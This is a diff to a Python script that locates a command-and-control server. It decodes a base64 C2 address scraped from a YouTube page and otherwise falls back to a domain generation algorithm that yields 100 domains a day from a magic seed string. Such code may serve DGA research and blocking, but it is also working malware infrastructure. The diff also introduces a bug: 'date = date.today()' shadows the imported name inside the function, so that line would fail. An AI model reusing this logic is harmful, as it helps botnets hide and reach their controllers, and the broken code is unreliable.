@@ -1,5 +1,5 @@
 from ctypes import c_int
-from datetime import datetime
+from datetime import date, timedelta
 import requests
 from bs4 import BeautifulSoup
 from base64 import b64decode
@@ -13,9 +13,8 @@ def get_cnc_from_youtube():
     if b64_encoded_url:
         return b64decode(b64_encoded_url["content"]).decode()
 
-
+# https://github.com/baderj/domain_generation_algorithms/tree/master/proslikefan
 def dga(date, magic, offset=1, tlds = ["me"]):
-    # https://github.com/baderj/domain_generation_algorithms/tree/master/proslikefan
     for tld in tlds:
         seed_string = '.'.join([str(s) for s in [magic, date.month, date.day, date.year, tld]])
         r = abs(hash_string(seed_string)) + offset
@@ -38,7 +37,7 @@ def hash_string(s):
 def generate_domains():
     domain = get_cnc_from_youtube()
     if not domain:
-        date = datetime.today()
+        date = date.today()
         magic = "Wubba Lubba Dub Dub"
         domains = [dga(date, magic, offset) for offset in range(100)]
         return domains
